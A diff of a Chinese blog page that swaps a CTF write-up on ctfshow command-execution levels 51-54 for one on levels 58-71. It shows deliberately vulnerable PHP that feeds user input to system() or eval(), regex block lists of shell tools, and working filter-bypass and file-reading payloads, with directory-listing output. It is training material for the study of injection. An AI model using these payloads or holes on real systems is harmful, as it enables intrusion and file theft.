@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ctfshow-web入门-命令执行-51-54, 博客,ctf,web">
+    <meta name="keywords" content="ctfshow-web入门-命令执行-58-71, 博客,ctf,web">
     <meta name="description" content="不会ACM，不会CTF，惨惨">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ctfshow-web入门-命令执行-51-54 | Rolemee的小破站</title>
+    <title>ctfshow-web入门-命令执行-58-71 | Rolemee的小破站</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -324,12 +324,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ctfshow-web入门-命令执行-51-54</h1>
+                    <h1 class="description center-align post-title">ctfshow-web入门-命令执行-58-71</h1>
                 </div>
             </div>
         </div>
@@ -480,28 +480,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-07-15
+                    2021-07-16
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-07-15
+                    2021-07-16
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    528
+                    1.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    8 分
                 </div>
                 
 
@@ -519,88 +519,8 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h1><p>源码</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-<span class="token comment">/*
-# -*- coding: utf-8 -*-
-# @Author: h1xa
-# @Date:   2020-09-05 20:49:30
-# @Last Modified by:   h1xa
-# @Last Modified time: 2020-09-05 22:42:52
-# @email: h1xa@ctfer.com
-# @link: https://ctfer.com
-
-*/</span>
-
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>同50类似</p>
-<p>payload<code>?c=nl&lt;fla&#39;&#39;g.php%7C%7C</code></p>
-<h1 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-<span class="token comment">/*
-# -*- coding: utf-8 -*-
-# @Author: h1xa
-# @Date:   2020-09-05 20:49:30
-# @Last Modified by:   h1xa
-# @Last Modified time: 2020-09-05 22:50:30
-# @email: h1xa@ctfer.com
-# @link: https://ctfer.com
-
-*/</span>
-
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>用上一题的老方法发现不行，发现只有一个flag is here ，这一看就是一个假的flag，尝试查看根目录</p>
-<p>payload<code>?c=ls$&#123;IFS&#125;/%7C%7C</code> 发现有flag，于是payload<code>?c=nl$&#123;IFS&#125;/fla&#39;&#39;g%7C%7C</code></p>
-<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><p>源码</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-<span class="token comment">/*
-# -*- coding: utf-8 -*-
-# @Author: h1xa
-# @Date:   2020-09-05 20:49:30
-# @Last Modified by:   h1xa
-# @Last Modified time: 2020-09-07 18:21:02
-# @email: h1xa@ctfer.com
-# @link: https://ctfer.com
-
-*/</span>
-
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token variable">$d</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>和52类似</p>
-<p>payload<code>?c=ta&#39;&#39;c$&#123;IFS&#125;fla&#39;&#39;g.php</code></p>
-<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><p>源码</p>
+                <pre><code>## web58
+</code></pre>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
 <span class="token comment">/*
@@ -608,27 +528,322 @@
 # @Author: Lazzaro
 # @Date:   2020-09-05 20:49:30
 # @Last Modified by:   h1xa
-# @Last Modified time: 2020-09-07 19:43:42
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/</span>
+
+<span class="token comment">// 你们在炫技吗？</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>发现没有过滤，但是禁用了很多函数，phpinfo()，system()等都被禁用了，但是尝试过后可以使用</p>
+<p>1·payload<code>c=copy(&#39;flag.php&#39;,&#39;1.txt&#39;);</code></p>
+<p>2·payload<code>c=show_source(&#39;flag.php&#39;);</code></p>
+<p>3·payload <code>c=echo file_get_contents(&#39;flag.php&#39;);</code></p>
+<p>4·include函数，下一题有payload</p>
+<h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token comment">/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/</span>
+
+<span class="token comment">// 你们在炫技吗？</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>1·payload<code>c=copy(&#39;flag.php&#39;,&#39;1.txt&#39;);</code></p>
+<p>2·payload<code>c=show_source(&#39;flag.php&#39;);</code></p>
+<p>3·payload<code>c=include(&#39;php://filter/convert.base64-encode/resource=flag.php&#39;);</code>,然后base64解码</p>
+<h2 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token comment">/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/</span>
+
+<span class="token comment">// 你们在炫技吗？</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>1·payload<code>c=copy(&#39;flag.php&#39;,&#39;1.txt&#39;);</code></p>
+<p>2·payload<code>c=show_source(&#39;flag.php&#39;);</code></p>
+<p>3·payload<code>c=include(&#39;php://filter/convert.base64-encode/resource=flag.php&#39;);</code>,然后base64解码</p>
+<p>4.payload<code>c=highlight_file(&#39;flag.php&#39;);</code></p>
+<h2 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token comment">/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/</span>
+
+<span class="token comment">// 你们在炫技吗？</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>1·payload<code>c=include(&#39;flag.php&#39;);echo $flag;</code></p>
+<p>2·payload<code>c=show_source(&#39;flag.php&#39;);</code></p>
+<p>3·payload<code>c=include(&#39;php://filter/convert.base64-encode/resource=flag.php&#39;);</code>,然后base64解码</p>
+<p>4.payload<code>c=highlight_file(&#39;flag.php&#39;);</code></p>
+<h2 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token comment">/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/</span>
+
+<span class="token comment">// 你们在炫技吗？</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>1·payload<code>c=include(&#39;flag.php&#39;);echo $flag;</code></p>
+<p>2·payload<code>c=show_source(&#39;flag.php&#39;);</code></p>
+<p>3·payload<code>c=include(&#39;php://filter/convert.base64-encode/resource=flag.php&#39;);</code>,然后base64解码</p>
+<p>4.payload<code>c=highlight_file(&#39;flag.php&#39;);</code></p>
+<h2 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token comment">/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/</span>
+
+<span class="token comment">// 你们在炫技吗？</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>1·payload<code>c=include(&#39;flag.php&#39;);echo $flag;</code></p>
+<p>2·payload<code>c=show_source(&#39;flag.php&#39;);</code></p>
+<p>3·payload<code>c=include(&#39;php://filter/convert.base64-encode/resource=flag.php&#39;);</code>,然后base64解码</p>
+<p>4.payload<code>c=highlight_file(&#39;flag.php&#39;);</code></p>
+<p>5.c=include(‘flag.php’);var_dump(get_defined_vars());</p>
+<h2 id="web64-65"><a href="#web64-65" class="headerlink" title="web64-65"></a>web64-65</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token comment">/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/</span>
+
+<span class="token comment">// 你们在炫技吗？</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>1·payload<code>c=include(&#39;flag.php&#39;);echo $flag;</code></p>
+<p>2·payload<code>c=show_source(&#39;flag.php&#39;);</code></p>
+<p>3·payload<code>c=include(&#39;php://filter/convert.base64-encode/resource=flag.php&#39;);</code>,然后base64解码</p>
+<p>4.payload<code>c=highlight_file(&#39;flag.php&#39;);</code></p>
+<p>5.payload<code>c=include(&#39;flag.php&#39;);var_dump(get_defined_vars());</code></p>
+<h2 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token comment">/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-07 19:40:53
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 19:41:00
 # @email: h1xa@ctfer.com
 # @link: https://ctfer.com
 
 */</span>
 
 
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+<span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">"秀秀得了,这次不在这里"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这次多禁用了一个show_source()；但是其他四种不影响，我们输入以后发现不是flag，猜测在别的目录</p>
+<p><code>c=print_r(scandir(&#39;.&#39;));</code>查看目录，发现没有多余的，于是查看根目录</p>
+<pre class="line-numbers language-none"><code class="language-none">Array
+(
+    [0] &#x3D;&gt; .
+    [1] &#x3D;&gt; ..
+    [2] &#x3D;&gt; .dockerenv
+    [3] &#x3D;&gt; bin
+    [4] &#x3D;&gt; dev
+    [5] &#x3D;&gt; etc
+    [6] &#x3D;&gt; flag.txt
+    [7] &#x3D;&gt; home
+    [8] &#x3D;&gt; lib
+    [9] &#x3D;&gt; media
+    [10] &#x3D;&gt; mnt
+    [11] &#x3D;&gt; opt
+    [12] &#x3D;&gt; proc
+    [13] &#x3D;&gt; root
+    [14] &#x3D;&gt; run
+    [15] &#x3D;&gt; sbin
+    [16] &#x3D;&gt; srv
+    [17] &#x3D;&gt; sys
+    [18] &#x3D;&gt; tmp
+    [19] &#x3D;&gt; usr
+    [20] &#x3D;&gt; var
+)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>找到flag.txt,在和之前一样</p>
+<p>1·payload<code>c=include(&#39;/flag.txt&#39;);echo $flag;</code></p>
+<p>2·payload<code>c=include(&#39;php://filter/convert.base64-encode/resource=/flag.txt&#39;);</code>,然后base64解码</p>
+<p>3.payload<code>c=highlight_file(&#39;/flag.txt&#39;);</code></p>
+<p>4.payload<code>c=include(&#39;/flag.txt&#39;);var_dump(get_defined_vars());</code></p>
+<h2 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h2><p>打开一看就是</p>
+<pre class="line-numbers language-none"><code class="language-none">Parse error: syntax error, unexpected end of file in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php(17) : eval()&#39;d code on line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>根据之前的网页，应该适合之前一样。然后print_r()也被禁用了，我们尝试使用var_dump来试试。</p>
+<pre class="line-numbers language-none"><code class="language-none">array(21) &#123;
+  [0]&#x3D;&gt;
+  string(1) &quot;.&quot;
+  [1]&#x3D;&gt;
+  string(2) &quot;..&quot;
+  [2]&#x3D;&gt;
+  string(10) &quot;.dockerenv&quot;
+  [3]&#x3D;&gt;
+  string(3) &quot;bin&quot;
+  [4]&#x3D;&gt;
+  string(3) &quot;dev&quot;
+  [5]&#x3D;&gt;
+  string(3) &quot;etc&quot;
+  [6]&#x3D;&gt;
+  string(8) &quot;flag.txt&quot;
+  [7]&#x3D;&gt;
+  string(4) &quot;home&quot;
+  [8]&#x3D;&gt;
+  string(3) &quot;lib&quot;
+  [9]&#x3D;&gt;
+  string(5) &quot;media&quot;
+  [10]&#x3D;&gt;
+  string(3) &quot;mnt&quot;
+  [11]&#x3D;&gt;
+  string(3) &quot;opt&quot;
+  [12]&#x3D;&gt;
+  string(4) &quot;proc&quot;
+  [13]&#x3D;&gt;
+  string(4) &quot;root&quot;
+  [14]&#x3D;&gt;
